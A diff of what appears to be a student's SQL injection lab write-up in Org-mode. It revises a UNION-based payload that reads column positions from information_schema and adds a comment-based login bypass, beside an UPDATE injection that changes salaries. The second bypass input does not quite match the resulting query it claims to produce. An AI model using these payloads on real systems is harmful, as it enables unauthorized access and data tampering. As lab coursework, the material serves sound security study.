@@ -43,10 +43,10 @@
       #+END_SRC
 *** After that we can use row_number over the partition and get the column numbers 
       #+BEGIN_SRC sql
-        select ans.colnum from (select column_name, row_number() over(order by column_name) as colnum from information_schema.columns where table_name = "credential")ans where column_name = "Name";
+        select ordinal_position from information_schema.columns where table_name = "credential" and column_name = "Name";
       #+END_SRC
 *** Now we can use this expression combined union attack to inject the code and we will get the column number of Name from 
-      Inject {{' OR FALSE UNION SELECT 1, (select ans.colnum from (select column_name, row_number() over(order by column_name) as colnum from information_schema.columns where table_name = "credential")ans where column_name = "Name"),null,null,null,null,null,null,null,null,null #}}
+      Inject {{' OR FALSE UNION SELECT 1, (select ordinal_position from information_schema.columns where table_name = "credential" and column_name = "Name"),null,null,null,null,null,null,null,null,null #}}
 
 ** Screenshot
 [[./screenshots/assignment/task-2-name-column-number.png]]
@@ -70,6 +70,7 @@
 * Task 5
 
 * Task 6
+** Approach 1
 *** If we provide eid with {{1' OR TRUE}} and password with {{pass' OR TRUE}} the transferred SQL looks like below.
     #+BEGIN_SRC sql
       SELECT * FROM customers
@@ -78,7 +79,15 @@
     #+END_SRC
     This in turn will either spit up all users or sign me as first user.
     Or we can inject other conditions instead of TRUE to get access for a specific user if we know the columns of the database.
-
+** Approach 2
+*** If we provide eid with {{' TRUE or /*}} and password with {{*/;--}} the transferred SQL looks like below.
+    #+BEGIN_SRC sql
+      SELECT * FROM customers
+      WHERE eid='' or TRUE /*
+      password='*/;-- OR TRUE;
+    #+END_SRC
+    This in turn will either spit up all users or sign me as first user.
+    Or we can inject other conditions instead of TRUE to get access for a specific user if we know the columns of the database.
     
 * Task 7
 *** If we set name {{Reddington', salary=1}} and we know an information like eid or other column value unique to the attacker we can update any columns we want.
